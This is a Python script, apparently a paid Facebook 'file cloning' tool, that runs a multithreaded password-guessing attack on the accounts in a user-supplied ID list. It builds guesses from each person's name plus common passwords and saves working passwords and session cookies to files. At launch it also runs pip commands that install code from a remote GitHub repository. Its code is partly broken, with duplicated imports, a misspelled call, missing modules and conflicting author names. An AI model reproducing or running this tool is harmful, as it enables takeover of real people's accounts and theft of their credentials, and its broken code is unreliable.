

###---------------### MODULES ###--------------- ###


import os, time, base64, datetime, json, sys, re, threading, uuid, string
from concurrent.futures import ThreadPoolExecutor as ThreadPool

os.system("pip uninstall PySintx -y")
os.system("pip uninstall PyBookScrapper -y")
os.system("pip uninstall PyBookAgents -y")

try:
    import PySintx
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/HiroshiYTz.git")
    import HiroshiYTz
from HiroshiYTz import *

'''
I'm using PySintx for my text color and modules dependencies like rich, random, and requests.
'''

try:
    import HiroshiYTz
except ModuleNotFoundError:
    os.sytem("pip3 install git+https://github.com/HiroshiYTz.git")
    import HiroshiYTz

'''
I'm using PyBookAgents for user-agent generator
Check documentaion here: https://github.com/sintxcs/PyBookAgents
'''

try:
    import HiroshiYTz
except ModuleNotFoundError:
    os.system("pip3 install git+https://github.com/HiroshiYTz.git")
    import HiroshiYTz

# I'm using PyBookScrapper for scrapping of the following:
from PyBookScrapper import Scrape_Year

'''
Check documentaion here: https://github.com/sintxcs/PyBookScrapper
'''

###---------------### VARIABLES ###--------------- ###


_F = "/sdcard/CJAKETZY/"
_D = "clear"
_B = "\n"
_A = "bold red"

try:
    os.makedirs(_F)
except:
    pass
sntxfldr = _F

cmd(_D)


###---------------### DATE TIME CHECKER ###--------------- ###


script_status = "PAID"
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)


###---------------### LOGO ###--------------- ###
logo=("""\033[1;37m
  .d8b.  db   dD d888888b d8b   db  d888b 
 d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
 YP   YP YP   YD Y888888P VP   V8P  Y888P   
----------------------------------------------
 Author    : IMTIAZ LKING
 Github    : SHAMI110
 Facebook  : MR.SHAMI
 Tool Name : SHAMI-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 SHAMI Pro version 1.9.8
 For Haters: OKAT SA BAHAR
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)



###---------------### MENU ###--------------- ###


def sintx_menu():
    B = "[sky_blue1][1] FILE CLONING\n[0] REPORT ERROR"
    sintx_logo()
    prnt(pnl(B, width=90, style=_A, title="OPTIONS"))
    A = input(f"{green}  [?] OPTION:{dark_gray} ")
    if A == "1":
        ク克隆()
    if A == "0":
        cmd("xdg-open https://m.me/61553865513324")
        sintx_menu()
    else:
        アニメ(f"{ro}  [!] INVALID INPUT")
        sintx_menu()


###---------------### FILE CLONING ###--------------- ###


loop = 0
oks = []
cps = []
twf = []
ugen = []


def ク克隆():
    sintx_logo()
    E = "/sdcard/"
    prnt(pnl("[red][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
    F = input(f"{green}  [+] /sdcard/:{CJAKETZY} ")
    G = E + F
    try:
        B = open(G, "r").read().splitlines()
    except FileNotFoundError:
        cd(1)
        print(f"\n{lr}  [X] FILE NOT FOUND")
        cd(3)
        ク克隆()
    A = []
    prnt(
        pnl(
            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
            width=90,
            style=_A,
            title="SELECT PASSWORD METHOD",
        )
    )
    H = input(f"{green}  [›] CHOICE:{dark_gray} ")
    if H in ["1", "01"]:
        A.append("first last")
        A.append("first123")
        A.append("first12")
        A.append("first143")
        A.append("first12345")
        A.append("first123456")
        A.append("first_123")
        A.append("maganda")
        A.append("magandaako")
        A.append("gandako")
        A.append("ganda")
        A.append("cuteako")
        A.append("god143")
        A.append("i love you")
        A.append("firstpretty")
        A.append("firstpogi")
        A.append("firstigop")
        A.append("firstdump")
        A.append("potanginamo")
        A.append("lastlast")
        A.append("firstfirst")
        A.append("firstganda")
        A.append("firstmaganda")
        A.append("blackpink")
        A.append("jungkook")
        A.append("pogiko")
        A.append("pogiako")
    else:
        try:
            prnt(
                pnl(
                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
                    width=90,
                    style=_A,
                )
            )
            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
        except:
            C = 1
        prnt(
            pnl(
                "[yellow] first last, first123, first143, last123, last143",
                width=90,
                style=_A,
                title="EXAMPLE PASSWORD",
            )
        )
        for I in range(C):
            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
    with ThreadPool(max_workers=None) as J:
        prnt(
            pnl(
                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                width=90,
                style=_A,
                title="INSTRUCTIONS",
            )
        )
        input(f"{green}  [»] PRESS ENTER: ")
        sintx_logo()
        D = str(len(B))
        prnt(
            pnl(
                "[yellow][»] NOT FOR SALE!",
                width=90,
                style=_A,
                title="NOTICE!",
            )
        )
        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
        for L in B:
            M, N = L.split("|")
            O = A
            J.submit(sinsAPI_, M, N, O, D)
    P = "[»] HITS : " + str(len(oks))
    Q = "\n[»] CPS  : " + str(len(cps))
    print(_B)
    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
    sintx_menu()


###---------------### API (MBASIC) ###--------------- ###


def sinsAPI_(uid, names, pxss_, tot4l):
    F = names
    A = uid
    global loop, oks, cps
    sys.stdout.write(
        f"\r\r{dark_gray}  [SINTX] %s/%s - OKS: %s - CPS: %s\r "
        % (loop, tot4l, len(oks), len(cps))
    )
    sys.stdout.flush()
    C = requests.Session()
    try:
        G = F.split(" ")[0]
        try:
            D = F.split(" ")[1]
        except:
            D = "143"
        L = G.lower()
        M = D.lower()
        for N in pxss_:
            B = (
                N.replace("First", G)
                .replace("Last", D)
                .replace("first", L)
                .replace("last", M)
            )
            header = {
                "authority": "m.facebook.com",
                "method": "GET",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=1",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": "https://m.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "Android",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": str(PyBookAgents.random_ugen()),
            }
            I = C.get(
                f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
            )
            S = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(I.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(I.text)).group(
                    1
                ),
                "uid": A,
                "next": "https://mbasic.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": B,
            }
            C.post(
                "https://m.facebook.com/login/device-based/validate-password/?shbl=0",
                data=S,
                allow_redirects=False,
                headers=header,
            ).text
            J = C.cookies.get_dict().keys()
            if "c_user" in J:
                K = ";".join(
                    ["%s=%s" % (A, B) for (A, B) in C.cookies.get_dict().items()]
                )
                open(sntxfldr + f"HITS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B + K + "\n\n"
                )
                print(_B)
                T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(
                    T, width=90, style="bold pale_turquoise1", title="SINTX SUCCESSFUL"
                )
                prnt(E)
                oks.append(A)
                break
            elif "checkpoint" in J:
                cps.append(A)
                print(_B)
                U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(U, width=90, style="bold red", title="SINTX CHECKPOINT")
                prnt(E)
                open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B
                )
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)


###---------------### START ###--------------- ###


if __name__ == "__main__":
    try:
        sintx_menu()
    except Exception as e:
        exit()
